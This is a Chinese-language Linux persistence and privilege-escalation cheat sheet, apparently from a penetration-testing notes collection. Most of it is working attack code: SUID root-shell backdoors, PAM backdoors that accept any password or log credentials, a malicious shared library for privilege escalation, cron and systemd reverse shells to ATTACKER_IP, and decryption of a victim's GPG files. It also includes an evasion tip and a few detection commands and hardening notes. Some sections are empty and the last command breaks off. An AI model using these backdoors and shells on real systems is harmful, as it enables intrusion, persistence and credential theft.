## 一、权限维持技术

### 1.1 SUID后门

#### 1.1.1 复制系统二进制文件
```bash
cp /usr/bin/bash /tmp/.hidden_bash
chmod 6755 /tmp/.hidden_bash
/tmp/.hidden_bash -p  # 获取root shell
```

#### 1.1.2 编译自定义SUID程序
```bash
cat << 'EOF' > /tmp/suid.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc /tmp/suid.c -o /tmp/suid_shell
chmod 6755 /tmp/suid_shell
```

#### 1.1.3 使用env作为包装器
```bash
cp /usr/bin/env /usr/bin/.system_helper
chmod 6755 /usr/bin/.system_helper
# 执行: /usr/bin/.system_helper /bin/sh -p
```

### 1.2 PAM后门

#### 1.2.1 概念
PAM（可插拔认证模块）是Linux的认证框架。修改PAM配置或库可以实现持久化后门。

#### 1.2.2 检查PAM配置
```bash
cat /etc/pam.d/sshd
cat /etc/pam.d/common-auth
cat /etc/pam.d/su
```

#### 1.2.3 修改pam_permit（允许任何密码登录）
在 `/etc/pam.d/sshd` 中添加：
```
auth sufficient pam_permit.so
```

#### 1.2.4 编译自定义PAM模块（密码记录）
创建 `toomanysecrets.sh` 脚本：
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```

配置PAM集成：
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# 添加：auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```

#### 1.2.5 修改pam_unix.so（后门密码）
1. 在 `common-auth` 文件中定位调用 `pam_unix.so` 的认证指令
2. 在 `pam_unix_auth.c` 源文件中添加条件语句，如果使用预定义密码则授予访问权限
3. 重新编译并替换修改后的 `pam_unix.so` 库
4. 测试：使用预定义密码可在各种服务（login、ssh、sudo、su、screensaver）中获得访问权限

> **TIP**: 可使用 [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) 自动化此过程

#### 1.2.6 PAM后门检测
```bash
# 检查自定义PAM库
find /lib/security/ -newer /lib/security/pam_permit.so 2>/dev/null
find /lib/x86_64-linux-gnu/security/ -newer /lib/x86_64-linux-gnu/security/pam_permit.so 2>/dev/null
rpm -V pam 2>/dev/null
dpkg -V libpam-modules 2>/dev/null
```

### 1.4 共享库劫持漏洞利用

#### 1.4.1 漏洞原理
当 `/etc/ld.so.conf.d/` 中的配置文件设置了非特权用户可写的文件夹路径时，攻击者可以伪造同名共享库，在特权程序执行时实现权限提升。

#### 1.4.2 环境准备示例

**sharedvuln.c**（目标程序）：
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```

**libcustom.h**：
```c
#include <stdio.h>
void vuln_func();
```

**libcustom.c**（原始库）：
```c
#include <stdio.h>
void vuln_func(){
    puts("Hi");
}
```

编译与安装：
```bash
gcc -shared -o libcustom.so -fPIC libcustom.c
sudo cp libcustom.so /usr/lib && sudo ldconfig
gcc sharedvuln.c -o sharedvuln -lcustom
```

#### 1.4.3 验证库加载路径
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```

#### 1.4.4 漏洞利用步骤

**场景1：利用ld.so.conf.d中的错误配置**

假设管理员创建了易受攻击的配置：
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```

创建恶意库 `/home/ubuntu/lib/libcustom.c`：
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
    setuid(0);
    setgid(0);
    puts("I'm the bad library");
    system("/bin/sh");
}
```

编译恶意库：
```bash
gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
```

等待root用户执行 `ldconfig` 或系统重启后，验证劫持：
```bash
ldd sharedvuln
# 应显示 libcustom.so => /home/ubuntu/lib/libcustom.so
```

> **TIP**: 若期望root执行，建议留下root拥有的文件而非交互式shell：
> ```c
> system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
> ```

**场景2：利用sudo ldconfig权限**

```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf

# 在/tmp中创建恶意库后执行
sudo ldconfig -f fake.ld.so.conf

# 验证劫持
ldd sharedvuln
```

#### 1.4.5 注意事项
- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常不起作用，重定向由当前shell完成，应使用 `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`
- **SUID/特权**二进制文件在安全执行模式下会忽略 `LD_LIBRARY_PATH`/`LD_PRELOAD`，但来自 `/etc/ld.so.conf` 的目录仍受信任
- 较新的glibc版本上，动态加载器暴露 `--list-diagnostics` 用于调试缓存解析

## 二、持久化技术

### 2.1 计划任务持久化

#### 2.1.1 Cron持久化

**用户级crontab**：
```bash
crontab -e
# 添加反向shell
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**系统级crontab**：
```bash
echo '*/5 * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' >> /etc/crontab
```

**cron.d目录**：
```bash
echo '*/5 * * * * root /tmp/backdoor.sh' > /etc/cron.d/backdoor
```

**cron.daily/hourly等**：
```bash
echo '#!/bin/bash' > /etc/cron.daily/backdoor
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/cron.daily/backdoor
chmod +x /etc/cron.daily/backdoor
```

#### 2.1.2 Systemd定时器

创建service文件：
```bash
cat << 'EOF' > /etc/systemd/system/backdoor.service
[Unit]
Description=System Update Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
EOF
```

创建timer文件：
```bash
cat << 'EOF' > /etc/systemd/system/backdoor.timer
[Unit]
Description=Run backdoor periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

systemctl enable backdoor.timer
systemctl start backdoor.timer
```

### 4.1 环境变量凭据收割


### 4.2 Systemd单元文件凭据提取

```bash
# 枚举单元文件和覆盖文件
ls -la /etc/systemd/system /lib/systemd/system

# 搜索Environment凭据
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x0/\n/g'
```

**示例发现**：

#### 4.2.1 加固建议
- 将密钥转移到专用密钥存储（`systemd-ask-password`、具有锁定权限的 `EnvironmentFile` 或外部密钥管理器）
- 避免在单元文件中嵌入凭据，优先使用仅root可读的覆盖文件
- 从版本控制中删除敏感单元文件
- 轮换测试期间发现的泄露密码

### 4.3 GPG密钥战利品解密

当找到加密的 `.gpg` 文件和用户的 `~/.gnupg` 文件夹，但因权限/锁定无法解密时：

```bash
# 1) 暂存可写主目录并复制受害者密钥环
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/

# 2) 确保所有权和权限正常
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg

# 3) 使用重定位主目录解密
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# 或
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```

> 如果密钥材料存在于 `private-keys-v1.d` 中，GPG将在不提示密码短语的情况下解锁和解密。

## 五、高级隐蔽技术

### 5.1 进程伪装（prctl + argv覆盖）

#### 5.1.1 技术原理
- 使用 `prctl(PR_SET_NAME, "<label>")` 设置短进程名称（15字节 `comm` 限制），通常设为 `init`
- 覆盖内存中的 `argv[0]` 缓冲区，用NUL填充，使 `/proc/<pid>/cmdline` 和 `ps` 显示假标签

#### 5.1.2 检测方法
- 比较 `/proc/<pid>/status` 中的 `Name:` 与实际可执行文件路径
- 查找具有微小/空白cmdline的进程拥有的回环互斥锁监听器

### 5.2 单实例互斥锁机制

#### 5.2.1 技术实现
- 将植入程序复制到多个可写路径（`/tmp`、`/var/tmp`、`/dev/shm`、`/run/lock`）
- 安装cron条目如 `*/5 * * * * /tmp/<bin>`，即使被删除也会重新生成
- 通过绑定固定回环端口（如 `127.0.0.1:51125` 或 `127.0.0.1:52225`）强制单实例执行
- 若 `bind()` 失败则退出

#### 5.2.2 检测命令
```bash
ss -lntp | grep -E '51125|52225'
```

> **注意**: 避免使用 `init_stop` 等常见投放器名称，选择唯一文件名。

### 5.3 BPF内核驻留被动后门（BPFDoor风格）

#### 5.3.1 技术概述
通过将恶意 **BPF套接字过滤器** 附加到原始或数据包套接字，植入程序保持被动状态，在内核路径中检查入站流量，仅在收到正确触发器时生成绑定/反弹shell。`netstat`、`ss` 和 `nmap` 在激活前显示正常。

#### 5.3.2 常见技术模式

| 模式 | 描述 |
|------|------|
| **植入/控制器分离模型** | 植入程序仅过滤流量并执行下一阶段；单独控制器制作激活数据包 |
| **HTTPS隐藏触发器** | 将激活字节隐藏在正常HTTPS请求中，通过反向代理、负载均衡器和TLS终止路径 |
| **固定偏移魔术标尺** | 控制器不完全解析HTTP，填充数据使标记落在可预测偏移量（如 `SOCK_DGRAM` 26字节，`SOCK_RAW` 40字节） |
| **ICMP中继** | 在精心制作的ICMP有效负载中转发命令，哨兵标记如 `0xFFFFFFFF` 用作"最终目的地/不转发" |
| **协议感知过滤** | 过滤异常传输（如SCTP），使植入程序更接近电信信令流量 |
| **伪装** | 结合 `prctl`/`argv[0]` 进程重命名及守护进程风格的PID或锁文件 |

#### 5.3.3 狩猎检测命令

```bash
# 原始/数据包套接字和附加的过滤器
ss -0pb | egrep -i 'packet|raw'
cat /proc/net/packet

# 将可疑PID映射到实际可执行文件和cmdline
for p in /proc/[0-9]*; do
  exe=$(readlink "$p/exe" 2>/dev/null)
  cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null)
  [ -n "$exe" ] && printf "%s | %s | %s\n" "${p##*/}" "$exe" "$cmd"
done | egrep -i 'agetty|smartd|init|dockerd|hpas'

# 常见环境标记和已删除/无文件执行
grep -aHE 'HOME=/tmp|HISTFILE=/dev/null' /proc/[0-9]*/environ 2>/dev/null
find /proc/[0-9]*/exe -lname '*deleted*' -ls 2>/dev/null

# 互斥锁/PID工件
find /var/run /run -maxdepth 1 -type f \( -name '*.pid' -o -name '*.lock' \) \
  -size 0c -printf '%m %p\n' 2>/dev/null

# 持久化路径检查
grep -RInE 'iptables|bpfd|dockerd|hpas|/dev/shm|/var/tmp|/tmp/' \
```
